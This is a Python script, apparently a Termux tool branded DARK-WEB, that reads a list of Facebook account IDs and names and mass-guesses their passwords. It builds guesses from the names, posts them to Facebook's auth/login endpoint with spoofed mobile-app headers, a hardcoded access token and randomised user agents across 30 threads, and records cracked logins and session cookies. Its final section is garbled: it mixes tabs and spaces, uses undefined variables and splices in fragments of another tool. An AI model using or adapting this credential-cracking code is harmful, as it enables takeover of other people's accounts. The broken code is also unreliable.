import os,time,random,re,sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0
ugen = []
for agent in range(random.randint(89999, 100000)):
    a='Mozilla/5.0 (iPod/'
    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
    a1='; CPU iPhone OS'
    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
    n='like Mac OS X)'
    c=random.randrange(7,12)
    m='en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(100,999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/'
    o=random.randrange(533,605)
    p='1'
    q=random.randrange(10,99)
    r='(KHTML, like Gecko) Chrome/'
    h=random.randrange(10,99)
    i='0'
    j=random.randrange(1000,9999)
    k=random.randrange(10,99)
    l='GSA/'
    ll=random.randrange(155,159)
    l1=random.randrange(1,9)
    l2=random.randrange(111111111,999999999)
    l3='Mobile/'
    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
    l5='Safari/'
    s=random.randrange(535,605)
    t=random.randrange(1,9)
    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
    ugen.append(fullagent)
    
def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo=(f"""
\033[38;5;46m      ╔╦╗╔═╗╦═╗╦╔═   \033[38;5;46m╦ ╦╔═╗╔╗ 
\033[38;5;46m       ║║╠═╣╠╦╝╠╩╗\x1b[38;5;196m───\033[38;5;46m║║║║╣ ╠╩╗
\033[38;5;46m      ═╩╝╩ ╩╩╚═╩ ╩   \033[38;5;46m╚╩╝╚═╝╚═╝
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[38;5;46m┃\033[1;91m\033[1;41m\033[1;97m   WELCOME DARK-WEB TERMUX ZONE    \033[;0m\033[1;91m\033[1;92m\033[38;5;46m┃
\033[38;5;46m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;46m┃\x1b[1;96mDEVOLPER  \033[1;97m:   \033[33;1mMD.ABDULLAH          \033[38;5;46m┃
\033[38;5;46m┃\033[38;5;46mFACEBOOK  \033[1;97m:   \x1b[1;96mABDULLAH AL MAMUN    \033[38;5;46m┃
\033[38;5;46m┃\033[35;1mGITHUB    \033[1;97m: \x1b[38;5;208m  DARKWEB-420          \033[38;5;46m┃
\033[38;5;46m┃\033[33;1mWATHSAPP  \033[1;97m: \033[1;97m  +8801725308028       \033[38;5;46m┃
\033[38;5;46m┃\033[38;5;46mTYPE      \033[1;97m:   \x1b[1;96mFILE-CLONE           \033[38;5;46m┃
\033[38;5;46m┃\x1b[38;5;208mFROM      \033[1;97m:   \033[38;5;46mBANGLADESH           \033[38;5;46m┃
\033[38;5;46m┃\033[1;97mVERSION   \033[1;97m:   \033[1;91m\033[1;41m\033[1;97m 1.2 \033[;0m\033[1;91m\033[1;92                  \033[38;5;46m┃
\033[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m\n
""")

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m---------------------------------')

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    lin3()
    cp =input('[?] Choice : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}DARK-WEB🖤{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              pswd = pswd.replace('first',first).replace('last',last).lower()
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
              if 6==random.randint(1,300):
                 #SHANTO-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
				os.system('espeak -a 300 " C,  P"')
			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#SHANTO-King
				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
				cek_apk(session,coki)
                 break
              else:
                   continue   
     except Exception as e:print(e);time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    



main_menu()